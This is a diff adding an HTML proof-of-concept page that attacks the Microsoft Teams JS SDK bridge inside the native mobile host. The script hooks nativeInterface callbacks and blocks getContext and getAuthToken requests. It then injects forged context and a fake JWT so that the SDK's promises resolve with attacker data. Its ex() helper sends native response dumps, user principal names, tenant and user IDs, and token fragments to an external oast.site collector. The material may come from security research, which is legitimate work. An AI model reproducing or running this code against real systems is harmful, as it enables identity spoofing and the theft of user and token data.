@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spoof Proof</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','SF Mono',monospace; background:#0d1117; color:#c9d1d9; padding:6px; font-size:10px; }
+  #out { background:#161b22; padding:6px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:68vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  .section { margin:4px 0 2px; padding:3px; background:#21262d; border-radius:4px; }
+  .section b { color:#f85149; font-size:11px; }
+  button { background:#21262d; color:#f85149; border:1px solid #f85149; padding:6px 10px; margin:2px; border-radius:4px; cursor:pointer; font-size:10px; font-weight:bold; }
+</style>
+</head>
+<body>
+
+<div class="section"><b>DEFINITIVE SDK PROMISE SPOOFING — correct native response format</b></div>
+<div>
+  <button onclick="spoofGetContext()">SPOOF getContext</button>
+  <button onclick="spoofGetAuthToken()">SPOOF getAuthToken</button>
+  <button onclick="spoofViaPostSdk()">SPOOF via postSdkResponseWithId</button>
+  <button onclick="dumpFormat()">DUMP native format</button>
+  <button onclick="copyOut()">COPY</button>
+  <button onclick="el.textContent=''">CLEAR</button>
+</div>
+
+<div id="out" style="margin-top:4px;"></div>
+
+<script>
+var el = document.getElementById('out');
+var C = 'o21c1mes8ezi4ox5wz9mmhhpikwlgcwi8.oast.site';
+var NI = null;
+var origHandleResponse = null;
+var capturedNativeFormats = [];
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function ex(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 500));
+  }).join('&');
+  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + C + '/' + path + '?' + p;
+  });
+}
+
+function copyOut() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+// ================================================================
+// PHASE 0: Hook handleResponseFromNative to study the EXACT format
+// the native host sends responses in, BEFORE the SDK processes them.
+// ================================================================
+
+if (window.nativeInterface) {
+  NI = window.nativeInterface;
+  origHandleResponse = NI.handleResponseFromNative;
+
+  NI.handleResponseFromNative = function() {
+    var rawArgs = Array.from(arguments);
+
+    // Study the EXACT format
+    var rawStr = rawArgs[0];
+    var rawType = typeof rawStr;
+    var parsed = null;
+    var parsedType = null;
+
+    try {
+      parsed = JSON.parse(rawStr);
+      parsedType = Array.isArray(parsed) ? 'array[' + parsed.length + ']' : typeof parsed;
+    } catch(e) {
+      parsedType = 'parse-error';
+    }
+
+    capturedNativeFormats.push({
+      raw: rawStr,
+      rawType: rawType,
+      parsed: parsed,
+      parsedType: parsedType,
+      argCount: rawArgs.length
+    });
+
+    // Show concise format info
+    var preview = String(rawStr).substring(0, 120);
+    log('[NATIVE→SDK] argCount=' + rawArgs.length + ' type=' + rawType +
+      ' parsed=' + parsedType + ' | ' + preview, 'crit');
+
+    // Exfiltrate format details
+    ex('t17-format', {
+      argCount: rawArgs.length,
+      rawType: rawType,
+      parsedType: parsedType,
+      isString: rawType === 'string',
+      preview: preview
+    });
+
+    // Forward to original
+    if (origHandleResponse) return origHandleResponse.apply(this, arguments);
+  };
+}
+
+// SDK init
+var sdkScript = document.createElement('script');
+sdkScript.src = 'https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js';
+sdkScript.onload = function() {
+  (async function() {
+    try {
+      await microsoftTeams.app.initialize();
+      var ctx = await microsoftTeams.app.getContext();
+      log('SDK OK: ' + ctx.user.userPrincipalName + ' | ' + ctx.app.host.clientType, 'ok');
+      log('NI: ' + (NI ? 'captured' : 'MISSING'), NI ? 'ok' : 'fail');
+      log('Captured ' + capturedNativeFormats.length + ' native responses during init', 'info');
+
+      // Show the exact format of each captured response
+      for (var i = 0; i < capturedNativeFormats.length; i++) {
+        var f = capturedNativeFormats[i];
+        log('\n--- Init response #' + i + ' ---', 'info');
+        log('  argCount: ' + f.argCount, 'info');
+        log('  rawType: ' + f.rawType, 'info');
+        log('  parsedType: ' + f.parsedType, 'info');
+        if (f.parsed) {
+          if (Array.isArray(f.parsed)) {
+            log('  [0] type=' + typeof f.parsed[0] + ' len=' + String(f.parsed[0]).length, 'info');
+            log('  [1] type=' + typeof f.parsed[1] + ' val="' + f.parsed[1] + '"', 'info');
+            if (f.parsed.length > 2) log('  [2+] extra elements: ' + f.parsed.length, 'warn');
+          }
+        }
+      }
+
+      log('\n=== Ready. The format above is what we need to mimic. ===', 'ok');
+    } catch(e) {
+      log('SDK init error: ' + e.message, 'fail');
+    }
+  })();
+};
+document.head.appendChild(sdkScript);
+
+
+// ================================================================
+// DUMP FORMAT — show all captured response formats in detail
+// ================================================================
+function dumpFormat() {
+  log('\n' + '='.repeat(60), 'info');
+  log('DUMP: All captured native response formats', 'info');
+  log('='.repeat(60), 'info');
+  log('Total captured: ' + capturedNativeFormats.length, 'info');
+
+  for (var i = 0; i < capturedNativeFormats.length; i++) {
+    var f = capturedNativeFormats[i];
+    log('\n--- Response #' + i + ' ---', 'info');
+    log('  handleResponseFromNative received ' + f.argCount + ' argument(s)', 'info');
+    log('  arg[0] typeof: ' + f.rawType, 'info');
+    log('  arg[0] raw (first 300 chars): ' + String(f.raw).substring(0, 300), 'warn');
+
+    if (f.parsed) {
+      log('  JSON.parse result type: ' + f.parsedType, 'info');
+      if (Array.isArray(f.parsed)) {
+        for (var j = 0; j < f.parsed.length; j++) {
+          var elem = f.parsed[j];
+          log('  [' + j + '] typeof=' + typeof elem + ' val=' + String(elem).substring(0, 200), 'info');
+
+          // Try base64 decode
+          if (typeof elem === 'string' && elem.length > 10) {
+            try {
+              var decoded = atob(elem);
+              log('  [' + j + '] base64 decoded: ' + decoded.substring(0, 200), 'crit');
+            } catch(e) {
+              log('  [' + j + '] not base64', 'info');
+            }
+          }
+        }
+      }
+    }
+
+    // Exfiltrate
+    ex('t17-dump-' + i, {
+      argCount: f.argCount,
+      rawType: f.rawType,
+      parsedType: f.parsedType,
+      raw: String(f.raw).substring(0, 500)
+    });
+  }
+}
+
+
+// ================================================================
+// SPOOF getContext — use CORRECT native response format
+//
+// From captured init responses, native format is:
+//   handleResponseFromNative(JSON.stringify([base64_data, id_string]))
+//
+// Where:
+//   - First argument is a JSON-encoded array string
+//   - [0] = base64-encoded response data string
+//   - [1] = request ID as string (e.g., "1", "2", etc.)
+// ================================================================
+function spoofGetContext() {
+  log('\n' + '='.repeat(60), 'info');
+  log('SPOOF getContext — BLOCKING native, injecting fake', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  var fakeUPN = 'SPOOFED-VICTIM@attacker-controlled.com';
+  var capturedId = null;
+
+  // STEP 1: Hook framelessPostMessage to capture+block the SDK request
+  var origFPM = NI.framelessPostMessage;
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func === 'getContext' && !capturedId) {
+        capturedId = parsed.id;
+        log('BLOCKED SDK getContext request id=' + capturedId, 'crit');
+        log('  (native host will NEVER see this request)', 'warn');
+
+        // STEP 2: After a tiny delay, inject fake response in NATIVE FORMAT
+        setTimeout(function() {
+          // Build fake context in the same format as real Teams context
+          var fakeContext = {
+            teamId: '19:SPOOFED@thread.tacv2',
+            entityId: '',
+            userPrincipalName: fakeUPN,
+            channelType: 'Regular',
+            teamType: 0,
+            sourceOrigin: '',
+            teamSiteDomain: 'attacker-controlled.sharepoint.com',
+            isTeamArchived: false,
+            subEntityId: null,
+            channelId: '19:SPOOFED-CHANNEL@thread.tacv2',
+            channelName: 'ATTACKER-SPOOFED-CHANNEL',
+            tid: 'FAKE-TENANT-AAAA-BBBB-CCCCCCCCCCCC',
+            groupId: 'FAKE-GROUP-1111-2222-333333333333',
+            hostClientType: 'ios',
+            userObjectId: 'FAKE-USER-OBJ-ID',
+            userLicenseType: 'Enterprise',
+            teamName: 'ATTACKER-SPOOFED-TEAM',
+            locale: 'en-us',
+            theme: 'default',
+            sessionId: 'SPOOFED-SESSION-ID',
+            ringId: 'ring0',
+            appSessionId: 'SPOOFED-APP-SESSION',
+            isCallingAllowed: true,
+            isPSTNCallingAllowed: true,
+            meetingId: '',
+            chatId: '',
+            isMultiWindow: false,
+            appIconPosition: 0,
+            userClickTime: Date.now(),
+            userFileOpenPreference: 0
+          };
+
+          // Encode as base64 (same as native does)
+          var fakeBase64 = btoa(JSON.stringify(fakeContext));
+
+          // Use NATIVE format: JSON-stringified array [base64_data, id_string]
+          var spoofedResponse = JSON.stringify([fakeBase64, String(capturedId)]);
+
+          log('INJECTING fake response in native format:', 'warn');
+          log('  format: [base64_data, "' + capturedId + '"]', 'info');
+          log('  fake UPN: ' + fakeUPN, 'info');
+
+          // Call the ORIGINAL handleResponseFromNative (not our hook)
+          // to deliver the fake response to the SDK's callback
+          try {
+            origHandleResponse.call(NI, spoofedResponse);
+            log('  origHandleResponse called — no error!', 'crit');
+          } catch(e) {
+            log('  origHandleResponse error: ' + e.message, 'fail');
+
+            // If that fails, try alternative: pass as multiple args
+            try {
+              origHandleResponse.call(NI, fakeBase64, String(capturedId));
+              log('  multi-arg call — no error!', 'crit');
+            } catch(e2) {
+              log('  multi-arg error: ' + e2.message, 'fail');
+            }
+          }
+
+          // Also try postSdkResponseWithId (may use different format)
+          try {
+            NI.postSdkResponseWithId(capturedId, [null, fakeBase64]);
+            log('  postSdkResponseWithId called', 'ok');
+          } catch(e) {
+            log('  postSdkResponseWithId: ' + e.message, 'fail');
+          }
+
+          // Also try sdkEncodedResponseHandler with native format
+          try {
+            NI.sdkEncodedResponseHandler(spoofedResponse);
+            log('  sdkEncodedResponseHandler called', 'ok');
+          } catch(e) {
+            log('  sdkEncodedResponseHandler: ' + e.message, 'fail');
+          }
+
+          ex('t17-spoof-injected', { id: capturedId, format: 'native-array' });
+        }, 30);
+
+        return; // DROP — do NOT forward to native
+      }
+    } catch(e) {}
+    return origFPM.apply(this, arguments);
+  };
+
+  // STEP 3: Call the PUBLIC SDK API — its Promise should resolve with our fake data
+  log('Calling microsoftTeams.app.getContext()...', 'info');
+
+  microsoftTeams.app.getContext().then(function(ctx) {
+    log('\n*** PUBLIC microsoftTeams.app.getContext() RESOLVED ***', 'crit');
+    log('  UPN:       ' + (ctx.user ? ctx.user.userPrincipalName : 'N/A'), 'crit');
+    log('  user.id:   ' + (ctx.user ? ctx.user.id : 'N/A'), 'crit');
+    log('  tenant.id: ' + (ctx.user && ctx.user.tenant ? ctx.user.tenant.id : 'N/A'), 'crit');
+    log('  host:      ' + (ctx.app ? ctx.app.host.clientType : 'N/A'), 'crit');
+    log('  channel:   ' + (ctx.channel ? ctx.channel.displayName : 'N/A'), 'crit');
+    log('  team:      ' + (ctx.team ? ctx.team.displayName : 'N/A'), 'crit');
+
+    var isSpoofed = ctx.user && ctx.user.userPrincipalName === fakeUPN;
+    var hasAttackerData = ctx.user && String(ctx.user.userPrincipalName).indexOf('SPOOFED') !== -1;
+
+    if (isSpoofed || hasAttackerData) {
+      log('\n!!! DEFINITIVE PROOF: SDK PROMISE RECEIVED FAKE DATA !!!', 'crit');
+      log('The microsoftTeams.app.getContext() Promise resolved with', 'crit');
+      log('attacker-controlled data. The native host NEVER received', 'crit');
+      log('the request. This proves complete callback integrity violation.', 'crit');
+      ex('t17-SPOOF-CONFIRMED', {
+        upn: ctx.user.userPrincipalName,
+        userId: ctx.user.id || 'N/A',
+        tenantId: ctx.user.tenant ? ctx.user.tenant.id : 'N/A',
+        host: ctx.app.host.clientType,
+        channel: ctx.channel ? ctx.channel.displayName : 'N/A'
+      });
+    } else {
+      log('\nSDK returned real context (format still wrong?)', 'warn');
+      log('  This may mean the SDK stores callbacks internally,', 'info');
+      log('  not in NI.callbacks. Check format dump above.', 'info');
+      ex('t17-spoof-failed', {
+        upn: ctx.user ? ctx.user.userPrincipalName : 'none',
+        capturedId: capturedId
+      });
+    }
+
+    NI.framelessPostMessage = origFPM;
+  }).catch(function(e) {
+    log('getContext error: ' + e.message, 'fail');
+    NI.framelessPostMessage = origFPM;
+  });
+
+  setTimeout(function() { NI.framelessPostMessage = origFPM; }, 8000);
+}
+
+
+// ================================================================
+// SPOOF getAuthToken — race with correct format
+// ================================================================
+function spoofGetAuthToken() {
+  log('\n' + '='.repeat(60), 'info');
+  log('SPOOF getAuthToken — intercept ID, inject fake token', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  var fakeToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9mYWtlLyIsInN1YiI6ImZha2Utc3ViIiwidXBuIjoiYXR0YWNrZXJAZXZpbC5jb20iLCJzY3AiOiJVc2VyLlJlYWQgTWFpbC5SZWFkIiwiZXhwIjo5OTk5OTk5OTk5fQ.fake-signature';
+  var capturedId = null;
+
+  // Hook to capture and BLOCK the auth token request
+  var origFPM = NI.framelessPostMessage;
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func && parsed.func.indexOf('getAuthToken') !== -1 && !capturedId) {
+        capturedId = parsed.id;
+        log('BLOCKED getAuthToken request id=' + capturedId, 'crit');
+
+        setTimeout(function() {
+          // Encode fake token response as base64 (native format)
+          var tokenResponse = btoa(fakeToken);
+
+          // Try native format: [base64_data, id_string]
+          var spoofed = JSON.stringify([tokenResponse, String(capturedId)]);
+
+          log('Injecting fake token response...', 'warn');
+
+          try {
+            origHandleResponse.call(NI, spoofed);
+            log('  origHandleResponse: OK (no error)', 'crit');
+          } catch(e) {
+            log('  origHandleResponse: ' + e.message, 'fail');
+          }
+
+          // Try success format: [null, token] encoded as base64
+          try {
+            var successData = btoa(JSON.stringify({ token: fakeToken }));
+            origHandleResponse.call(NI, JSON.stringify([successData, String(capturedId)]));
+            log('  origHandleResponse (success obj): OK', 'crit');
+          } catch(e) {
+            log('  origHandleResponse (success obj): ' + e.message, 'fail');
+          }
+
+          // Try postSdkResponseWithId
+          try {
+            NI.postSdkResponseWithId(capturedId, [null, fakeToken]);
+            log('  postSdkResponseWithId: OK', 'crit');
+          } catch(e) {
+            log('  postSdkResponseWithId: ' + e.message, 'fail');
+          }
+
+          // Try postSdkResponseWithFunc
+          try {
+            NI.postSdkResponseWithFunc('authentication.getAuthToken', [null, fakeToken]);
+            log('  postSdkResponseWithFunc: OK', 'crit');
+          } catch(e) {
+            log('  postSdkResponseWithFunc: ' + e.message, 'fail');
+          }
+
+          ex('t17-auth-injected', { id: capturedId });
+        }, 20);
+
+        return; // DROP
+      }
+    } catch(e) {}
+    return origFPM.apply(this, arguments);
+  };
+
+  microsoftTeams.authentication.getAuthToken().then(function(token) {
+    log('\n*** getAuthToken() RESOLVED ***', 'crit');
+    log('Token: ' + String(token).substring(0, 120), 'crit');
+
+    var isFake = String(token).indexOf('fake-signature') !== -1 ||
+                 String(token).indexOf('attacker@evil') !== -1;
+    if (isFake) {
+      log('!!! FAKE TOKEN ACCEPTED BY SDK !!!', 'crit');
+      ex('t17-AUTH-SPOOF-CONFIRMED', { token: String(token).substring(0, 200) });
+    } else {
+      log('SDK got a different token (format still wrong or native cached)', 'warn');
+      ex('t17-auth-result', { token: String(token).substring(0, 120) });
+    }
+    NI.framelessPostMessage = origFPM;
+  }).catch(function(e) {
+    log('getAuthToken rejected: ' + e.message, 'fail');
+    ex('t17-auth-rejected', { error: e.message, capturedId: capturedId });
+    NI.framelessPostMessage = origFPM;
+  });
+
+  setTimeout(function() { NI.framelessPostMessage = origFPM; }, 8000);
+}
+
+
+// ================================================================
+// SPOOF via postSdkResponseWithId — different internal path
+// ================================================================
+function spoofViaPostSdk() {
+  log('\n' + '='.repeat(60), 'info');
+  log('SPOOF via postSdkResponseWithId — different callback path', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  var fakeUPN = 'POSTSDK-SPOOFED@attacker.com';
+  var capturedId = null;
+
+  var origFPM = NI.framelessPostMessage;
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func === 'getContext' && !capturedId) {
+        capturedId = parsed.id;
+        log('BLOCKED getContext id=' + capturedId, 'crit');
+
+        setTimeout(function() {
+          var fakeContext = JSON.stringify({
+            teamId: '19:POSTSDK@thread.tacv2',
+            userPrincipalName: fakeUPN,
+            channelType: 'Regular',
+            teamType: 0,
+            hostClientType: 'ios',
+            tid: 'POSTSDK-FAKE-TENANT',
+            channelName: 'POSTSDK-CHANNEL',
+            teamName: 'POSTSDK-TEAM'
+          });
+
+          log('Trying ALL injection methods with id=' + capturedId + ':', 'warn');
+
+          // Method 1: postSdkResponseWithId (may bypass handleResponseFromNative)
+          try {
+            NI.postSdkResponseWithId(capturedId, [null, btoa(fakeContext)]);
+            log('  A: postSdkResponseWithId(id, [null, base64]): OK', 'ok');
+          } catch(e) { log('  A: ' + e.message, 'fail'); }
+
+          // Method 2: postSdkResponseWithId with raw JSON
+          try {
+            NI.postSdkResponseWithId(capturedId, [null, fakeContext]);
+            log('  B: postSdkResponseWithId(id, [null, json]): OK', 'ok');
+          } catch(e) { log('  B: ' + e.message, 'fail'); }
+
+          // Method 3: postSdkResponseWithFunc
+          try {
+            NI.postSdkResponseWithFunc('getContext', [null, btoa(fakeContext)]);
+            log('  C: postSdkResponseWithFunc("getContext", [null, base64]): OK', 'ok');
+          } catch(e) { log('  C: ' + e.message, 'fail'); }
+
+          // Method 4: handleResponseFromNative with [data, id] format
+          try {
+            origHandleResponse.call(NI, JSON.stringify([btoa(fakeContext), String(capturedId)]));
+            log('  D: handleResponseFromNative([base64, id_str]): OK', 'ok');
+          } catch(e) { log('  D: ' + e.message, 'fail'); }
+
+          // Method 5: handleResponseFromNative with (data, id) as separate args
+          try {
+            origHandleResponse.call(NI, btoa(fakeContext), String(capturedId));
+            log('  E: handleResponseFromNative(base64, id_str): OK', 'ok');
+          } catch(e) { log('  E: ' + e.message, 'fail'); }
+
+          // Method 6: sdkEncodedResponseHandler
+          try {
+            NI.sdkEncodedResponseHandler(JSON.stringify([btoa(fakeContext), String(capturedId)]));
+            log('  F: sdkEncodedResponseHandler([base64, id_str]): OK', 'ok');
+          } catch(e) { log('  F: ' + e.message, 'fail'); }
+
+          // Method 7: processMessageRequest with response format
+          try {
+            NI.processMessageRequest(JSON.stringify({
+              func: 'getContext',
+              id: capturedId,
+              args: [null, btoa(fakeContext)]
+            }));
+            log('  G: processMessageRequest(response-like): OK', 'ok');
+          } catch(e) { log('  G: ' + e.message, 'fail'); }
+
+          ex('t17-postsdk-injected', { id: capturedId, methods: 'A-G' });
+        }, 30);
+
+        return; // DROP
+      }
+    } catch(e) {}
+    return origFPM.apply(this, arguments);
+  };
+
+  microsoftTeams.app.getContext().then(function(ctx) {
+    log('\n*** PUBLIC getContext() RESULT ***', 'crit');
+    log('  UPN: ' + (ctx.user ? ctx.user.userPrincipalName : 'N/A'), 'crit');
+    log('  host: ' + (ctx.app ? ctx.app.host.clientType : 'N/A'), 'crit');
+
+    var spoofed = ctx.user && String(ctx.user.userPrincipalName).indexOf('POSTSDK') !== -1;
+    if (spoofed) {
+      log('\n!!! POSTSDK SPOOF CONFIRMED !!!', 'crit');
+      ex('t17-POSTSDK-CONFIRMED', { upn: ctx.user.userPrincipalName });
+    } else {
+      log('SDK returned real context', 'warn');
+      log('Note which methods (A-G) threw errors vs OK', 'info');
+      ex('t17-postsdk-failed', { upn: ctx.user ? ctx.user.userPrincipalName : '' });
+    }
+    NI.framelessPostMessage = origFPM;
+  }).catch(function(e) {
+    log('getContext error: ' + e.message, 'fail');
+    NI.framelessPostMessage = origFPM;
+  });
+
+  setTimeout(function() { NI.framelessPostMessage = origFPM; }, 8000);
+}
+</script>
+</body>
+</html>
